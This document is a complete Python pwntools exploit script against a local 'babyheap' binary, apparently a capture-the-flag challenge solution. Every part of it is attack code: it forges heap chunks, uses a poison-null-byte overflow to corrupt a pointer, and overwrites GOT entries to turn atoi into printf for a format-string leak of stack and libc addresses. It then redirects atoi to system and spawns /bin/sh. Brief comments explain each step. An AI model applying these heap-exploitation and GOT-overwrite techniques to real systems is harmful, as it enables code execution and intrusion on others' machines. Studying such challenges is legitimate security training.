from pwn import *
import logging

p = process("./babyheap")

target_addr = 0x602078

# place a fake chunk of size 0x60 in the printf chunk
p.sendline("4")
p.sendline("no"*4 + "A"*0xfe0 + p64(0x61))
p.sendline("1")

p.recvuntil("Size :")
p.sendline("120")

p.recvuntil("Content:")
# place a fake chunk of 0x51 so we can free the fake chunk of 0x61
p.sendline(p64(0)*3 + p64(0x51))

# poison null byte, change the chunk ptr to point to the first fake chunk.
p.recvuntil("Name:")
p.sendline("B"*8)

p.recvuntil("Your choice:")

# free fake chunk of 0x60 and normal chunk of 0x20
p.sendline("2")
p.recvuntil("Your choice:")

#remalloc
p.sendline("1")

p.recvuntil("Size :")
# malloc our fake chunk of 0x60, which has our valid chunk of 0x20 inside of it
p.sendline("88")
p.recvuntil("Content:")
# smash the pointer in the valid chunk to point to wherever
p.sendline(p64(0)*3 + p64(0x21) + p64(0x100) + "C"*8 + p64(target_addr) + p64(0x81))

p.recvuntil("Name:")
p.sendline("a")

p.recvuntil("Your choice:")

# write to the corrupted pointer in the valid chunk
p.sendline("3")
p.recvuntil("Content:")

# flip the globals so we can now edit and free again!
#changing atoi to printf, so we can use it as a format string and leak the stack
# scanf now calls into the new function,
p.sendline(p64(0x400780) + p64(0x400a9a))

p.recvuntil("Your choice:")
p.send("%llx"*4)
data = p.recv()
stack_leak = int(data[0:12], 16)
libc_leak = int(data[14:26], 16)

print "Stack leak:", hex(stack_leak)
print "Libc leak:", hex(libc_leak)
p.sendline("111")
p.recvuntil("Really?")

system_addr = libc_leak-857628

# smashing our way to the global heap pointer
stdout_ptr = libc_leak + 2808948

# use read in new function to rewrite some of the got
# atoi now points to system, the global chunk ptr now points to addr_of_puts_in_got-8
p.sendline(p64(system_addr) + p64(0) + p64(0)*2 + p64(stdout_ptr) + p64(0) + p64(0) + p64(0x602028))
p.recvuntil("Name:")

p.send(p64(0x400916))
p.sendline("/bin/sh\x00")

p.interactive()
